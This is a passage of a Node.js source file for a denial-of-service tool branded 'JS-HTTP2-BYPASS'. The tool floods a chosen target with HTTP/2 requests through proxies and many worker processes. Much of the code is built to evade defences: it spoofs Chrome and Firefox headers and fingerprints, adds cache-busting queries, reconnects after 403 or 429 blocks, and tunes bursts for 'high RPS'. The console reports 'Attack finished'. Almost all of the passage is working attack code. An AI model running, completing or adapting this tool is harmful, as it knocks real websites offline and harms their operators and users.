                            crypto.constants.SSL_OP_NO_SSLv2 |
                            crypto.constants.SSL_OP_NO_SSLv3 |
                            crypto.constants.SSL_OP_NO_TLSv1 |
                            crypto.constants.SSL_OP_NO_TLSv1_1 |
                            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
                        honorCipherOrder: true
                    };

                    const tlsSocket = tls.connect(tlsOptions);

                    tlsSocket.on('secureConnect', () => {
                        if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
                            if (forceHttp === 2) {
                                tlsSocket.destroy();
                                netSocket.destroy();
                                setTimeout(go, 1);
                                return;
                            }
                            tlsSocket.destroy();
                            netSocket.destroy();
                            setTimeout(go, 1);
                        } else {
                            handleHTTP2Connection(tlsSocket, fingerprint);
                        }
                    });

                    tlsSocket.on('error', () => {
                        tlsSocket.destroy();
                        netSocket.destroy();
                        setTimeout(go, 1);
                    });

                    tlsSocket.on('close', () => {
                        netSocket.destroy();
                        setTimeout(go, 1);
                    });

                    tlsSocket.setTimeout(8000, () => {
                        tlsSocket.destroy();
                        netSocket.destroy();
                    });

                } else {
                    netSocket.destroy();
                    setTimeout(go, 1);
                }
            }
        };

        netSocket.on('data', dataHandler);

    }).on('error', () => {
        setTimeout(go, 1);
    }).on('close', () => {
        setTimeout(go, 1);
    }).on('timeout', () => {
        netSocket.destroy();
        setTimeout(go, 1);
    });
}

// Browser Header Function - FIXED: Only one definition
function BrowserHeader(fingerprint, pathValue) {
    const browserType = fingerprint.browserType || 'chrome';
    const browserVersion = getRandomInt(120, 131);

    if (!pathValue || !pathValue.startsWith('/')) {
        pathValue = '/' + (pathValue || '');
    }

    let headers = [
        [":method", reqmethod ? reqmethod.toUpperCase() : "GET"],
        [":authority", url.hostname],
        [":scheme", "https"],
        [":path", pathValue]
    ];

    const regularHeaders = [];

    if (browserType === 'chrome' || browserType === 'edge') {
        if (fingerprint.navigator?.sextoy) {
            regularHeaders.push(["sec-ch-ua", fingerprint.navigator.sextoy]);
        }
        regularHeaders.push(["sec-ch-ua-mobile", "?0"]);
        regularHeaders.push(["sec-ch-ua-platform", '"Windows"']);
        regularHeaders.push(["upgrade-insecure-requests", "1"]);

        if (fingerprint.navigator?.userAgent) {
            regularHeaders.push(["user-agent", fingerprint.navigator.userAgent]);
        }

        regularHeaders.push(["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"]);
        regularHeaders.push(["sec-fetch-site", "none"]);
        regularHeaders.push(["sec-fetch-mode", "navigate"]);
        regularHeaders.push(["sec-fetch-user", "?1"]);
        regularHeaders.push(["sec-fetch-dest", "document"]);
        regularHeaders.push(["accept-encoding", "gzip, deflate, br, zstd"]);
        regularHeaders.push(["accept-language", fingerprint.navigator?.language || "en-US,en;q=0.9"]);
        regularHeaders.push(["priority", "u=0, i"]);

    } else if (browserType === 'firefox') {
        regularHeaders.push(["user-agent", fingerprint.navigator?.userAgent || "Mozilla/5.0"]);
        regularHeaders.push(["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"]);
        regularHeaders.push(["accept-language", fingerprint.navigator?.language || "en-US,en;q=0.5"]);
        regularHeaders.push(["accept-encoding", "gzip, deflate, br, zstd"]);
        regularHeaders.push(["upgrade-insecure-requests", "1"]);
        regularHeaders.push(["sec-fetch-dest", "document"]);
        regularHeaders.push(["sec-fetch-mode", "navigate"]);
        regularHeaders.push(["sec-fetch-site", "none"]);
        regularHeaders.push(["sec-fetch-user", "?1"]);
        regularHeaders.push(["te", "trailers"]);
    }

    if (typeof hcookie !== 'undefined' && hcookie) {
        regularHeaders.push(["cookie", hcookie]);
    }

    return [...headers, ...regularHeaders];
}

function handleHTTP2Connection(tlsSocket, fingerprint) {
    let streamId = 1;
    let data = Buffer.alloc(0);
    let hpack = new HPACK();
    hpack.setTableSize(4096);

    const connectionId = crypto.randomBytes(16).toString('hex');
    activeConnections.set(connectionId, {
        socket: tlsSocket,
        createdAt: Date.now(),
        requestCount: 0,
        fingerprint: fingerprint,
        successStreak: 0
    });

    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(16777215, 0); // Max window for high throughput

    const frames = [
        Buffer.from(PREFACE, 'binary'),
        encodeFrame(0, 4, encodeSettings([
            [1, 65536],   // Max header table size
            [2, 0],       // Disable push
            [3, 1000],    // Max concurrent streams (HIGH for RPS)
            [4, 16777215], // Max window size
            [5, 16384],   // Max frame size
            [6, 65536]    // Max header list size
        ])),
        encodeFrame(0, 8, updateWindow)
    ];

    let isClosing = false;
    let goAwayReceived = false;
    let requestCount = 0;
    let lastRequestTime = Date.now();
    let successStreak = 0;
    let errorStreak = 0;
    let settingsReceived = false;
    let windowSize = 16777215;

    // WINDOW UPDATE handler for high throughput
    let lastWindowUpdate = Date.now();

    tlsSocket.on('data', (eventData) => {
        data = Buffer.concat([data, eventData]);

        while (data.length >= 9) {
            const frame = decodeFrame(data);
            if (frame != null) {
                data = data.subarray(9 + frame.length);

                if (frame.type == 4 && frame.flags == 0) {
                    settingsReceived = true;
                    tlsSocket.write(encodeFrame(0, 4, "", 1));
                }

                if (frame.type == 1) {
                    try {
                        const decodedHeaders = hpack.decode(frame.payload);
                        const statusHeader = decodedHeaders.find(x => x[0] == ':status');
                        if (statusHeader) {
                            const status = parseInt(statusHeader[1]);

                            if (debugMode) {
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++;
                            }

                            if (status >= 200 && status < 300) {
                                successStreak++;
                                errorStreak = 0;

                                // Update window for more throughput
                                if (Date.now() - lastWindowUpdate > 1000 && windowSize > 0) {
                                    windowSize -= 65536;
                                    if (windowSize < 1048576) {
                                        windowSize = 16777215;
                                        const winUpdate = Buffer.alloc(4);
                                        winUpdate.writeUInt32BE(windowSize, 0);
                                        tlsSocket.write(encodeFrame(0, 8, winUpdate));
                                        lastWindowUpdate = Date.now();
                                    }
                                }
                            } else if (status === 429 || status === 403) {
                                errorStreak++;
                                successStreak = 0;

                                if (errorStreak > 2) {
                                    isClosing = true;
                                    setTimeout(() => {
                                        if (!tlsSocket.destroyed) {
                                            tlsSocket.destroy();
                                        }
                                    }, 50);
                                    setTimeout(go, 1000);
                                    return;
                                }
                            }
                        }
                    } catch (e) {}
                }

                if (frame.type == 7) {
                    goAwayReceived = true;
                    isClosing = true;
                    if (!tlsSocket.destroyed) {
                        tlsSocket.destroy();
                    }
                    setTimeout(go, 500);
                    return;
                }

                if (frame.type == 6 && frame.flags == 0) {
                    tlsSocket.write(encodeFrame(0, 6, frame.payload, 1));
                }

            } else {
                break;
            }
        }
    });

    const cleanup = () => {
        activeConnections.delete(connectionId);
        if (!tlsSocket.destroyed) {
            tlsSocket.destroy();
        }
    };

    tlsSocket.on('close', cleanup);
    tlsSocket.on('error', cleanup);

    tlsSocket.write(Buffer.concat(frames));

    // Start MULTIPLE aggressive request loops for high RPS
    const startTime = Date.now();
    const maxDuration = 30000; // Keep connection alive for 30 seconds max

    function sendRequestsLoop(loopId) {
        if (isClosing || tlsSocket.destroyed || Date.now() - startTime > maxDuration) {
            return;
        }

        if (!settingsReceived) {
            setTimeout(() => sendRequestsLoop(loopId), 50);
            return;
        }

        // Send BURST of requests for high RPS
        const burstSize = Math.min(10, Math.floor(successStreak / 10) + 1);

        for (let i = 0; i < burstSize; i++) {
            if (isClosing || tlsSocket.destroyed) break;

            setTimeout(() => {
                if (isClosing || tlsSocket.destroyed) return;

                sendSingleRequest();
            }, i * 2); // Stagger requests by 2ms
        }

        // Calculate next burst timing based on success rate
        let nextDelay;
        if (successStreak > 20) {
            nextDelay = Math.max(10, 1000 / (initialRatelimit * 3)); // Ultra fast if successful
        } else if (successStreak > 10) {
            nextDelay = Math.max(20, 1000 / (initialRatelimit * 2));
        } else {
            nextDelay = Math.max(50, 1000 / initialRatelimit);
        }

        setTimeout(() => sendRequestsLoop(loopId), nextDelay);
    }

    function sendSingleRequest() {
        if (isClosing || tlsSocket.destroyed) return;

        requestCount++;
        lastRequestTime = Date.now();

        let pathValue = url.pathname;
        if (query) {
            pathValue = handleQuery(query);
        } else if (Math.random() > 0.8) {
            pathValue += generateCacheQuery();
        }

        if (!pathValue || pathValue === '') {
            pathValue = '/';
        }

        const headersArray = BrowserHeader(fingerprint, pathValue);

        // Minimal headers for speed
        if (isFull) {
            headersArray.push(["accept-encoding", "gzip, deflate, br"]);
        }

        try {
            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(headersArray)
            ]);

            tlsSocket.write(encodeFrame(streamId, 1, packed, 0x25));
            streamId += 2;

        } catch (error) {
            // Ignore and continue
        }
    }

    // Start 5 parallel loops for maximum throughput
    for (let i = 0; i < 5; i++) {
        setTimeout(() => {
            sendRequestsLoop(i);
        }, i * 10);
    }
}

if (cluster.isMaster) {
    const workers = {};

    console.log(`${chalk.magenta.bold('JS-HTTP2-BYPASS - HIGH PERFORMANCE MODE')}`);
    console.log(`Target: ${chalk.yellow(target)}`);
    console.log(`Time: ${chalk.cyan(time)}s, Threads: ${chalk.cyan(threads)}, Rate: ${chalk.cyan(initialRatelimit)}req/s`);
    console.log(`Proxies: ${chalk.cyan(proxy.length)} loaded`);
    console.log(`${chalk.green('GOAL:')} 5000+ connections with 200 status codes\n`);

    // Create more workers if needed
    const workerCount = Math.max(threads, Math.min(proxy.length / 100, 100));

    for (let i = 0; i < workerCount; i++) {
        setTimeout(() => {
            const worker = cluster.fork({
                WORKER_ID: i,
                AGGRESSIVE_MODE: 'true'
            });
            workers[worker.id] = [worker, {}];
        }, i * 100);
    }

    cluster.on('exit', (worker) => {
        delete workers[worker.id];
        // Restart with delay
        setTimeout(() => {
            cluster.fork();
        }, 2000);
    });

    cluster.on('message', (worker, message) => {
        if (workers[worker.id]) {
            workers[worker.id][1] = message;
        }
    });

    // Enhanced debug display
    if (debugMode) {
        setInterval(() => {
            let statusSummary = {};
            let totalConnections = 0;
            let totalRequests = 0;
            let activeWorkers = 0;

            for (let id in workers) {
                if (workers[id] && workers[id][0].state === 'online') {
                    activeWorkers++;

                    // Get status data from worker
                    const workerData = workers[id][1];
                    if (Array.isArray(workerData)) {
                        for (let st of workerData) {
                            for (let code in st) {
                                if (code !== 'proxyConnections') {
                                    if (!statusSummary[code]) statusSummary[code] = 0;
                                    statusSummary[code] += st[code];
                                    totalRequests += st[code];
                                }
                            }
                            totalConnections += st.proxyConnections || 0;
                        }
                    }
                }
            }

            // Calculate success rate
            const successRequests = (statusSummary['200'] || 0) + (statusSummary['201'] || 0) + (statusSummary['204'] || 0);
            const blockedRequests = statusSummary['403'] || 0;
            const errorRequests = statusSummary['400'] || 0;
            const successRate = totalRequests > 0 ? (successRequests / totalRequests * 100).toFixed(2) : 0;

            // Sort by count descending
            const sortedStatuses = Object.entries(statusSummary)
                .sort((a, b) => b[1] - a[1])
                .slice(0, 8);

            const statusString = sortedStatuses
                .map(([status, count]) => colorizeStatus(status, count))
                .join(', ');

            const now = new Date();
            const timeStr = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;

            console.log(`[${timeStr}] ${chalk.green('ACTIVE:')} ${chalk.cyan(totalConnections)} | Workers: ${chalk.cyan(activeWorkers)}/${workerCount} | Success: ${chalk.green(successRate + '%')}`);

            if (sortedStatuses.length > 0) {
                console.log(`       ${chalk.gray('Status:')} ${statusString}`);
            }
        }, 1000);
    }

    // Handle graceful shutdown
    process.on('SIGINT', () => {
        console.log('\nAttack interrupted. Shutting down workers...');
        for (let id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => process.exit(0), 1000);
    });

    // Auto-stop after specified time
    setTimeout(() => {
        console.log('\nAttack finished');
        for (let id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => process.exit(0), 1000);
    }, time * 1000);

} else {
    // Worker process
    try {
        if (process.platform === 'linux' && process.env.WORKER_ID !== undefined) {
            const cpuId = parseInt(process.env.WORKER_ID) % os.cpus().length;
            exec(`taskset -cp ${cpuId} ${process.pid}`);
        }
    } catch (err) {
        // Ignore
    }

    // Dynamic parameter adjustment
    const paramInterval = setInterval(() => {
        timer++;
        if (timer <= 30) {
            custom_header = Math.min(262144, custom_header + getRandomInt(100, 500));
            custom_window = Math.min(6291456, custom_window + getRandomInt(5000, 20000));
            custom_table = Math.min(65536, custom_table + getRandomInt(100, 500));
            custom_update = Math.min(15663105, custom_update + getRandomInt(5000, 20000));
        } else {
            custom_table = 65536;
            custom_window = 6291456;
            custom_header = 262144;
            custom_update = 15663105;
            timer = 0;
        }
    }, 5000);

    // Aggressive mode worker
    if (process.env.AGGRESSIVE_MODE === 'true') {
        const startupDelay = parseInt(process.env.WORKER_ID || '0') * 500 + Math.random() * 500;

        setTimeout(() => {
            let connectionCount = 0;
            const maxConnections = Math.min(5000, threads * 100);

            // Aggressive connection creation
            const interval = setInterval(() => {
                const batchSize = getRandomInt(10, 50);
                for (let i = 0; i < batchSize; i++) {
                    if (connectionCount < maxConnections) {
                        connectionCount++;
                        setTimeout(go, i * 5);
                    }
                }
            }, getRandomInt(50, 200));

            setTimeout(() => {
                clearInterval(interval);
                clearInterval(paramInterval);
            }, time * 1000);
        }, startupDelay);
    }

    // Send status updates
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 3) statusesQ.shift();
            statusesQ.push({ ...statuses, proxyConnections });
            statuses = {};
            proxyConnections = 0;
            try {
                process.send(statusesQ);
            } catch (err) {
                // Ignore
            }
        }, 2000);
    }

    // Worker timeout
    setTimeout(() => {
        process.exit(0);
    }, time * 1000 + 5000);
}
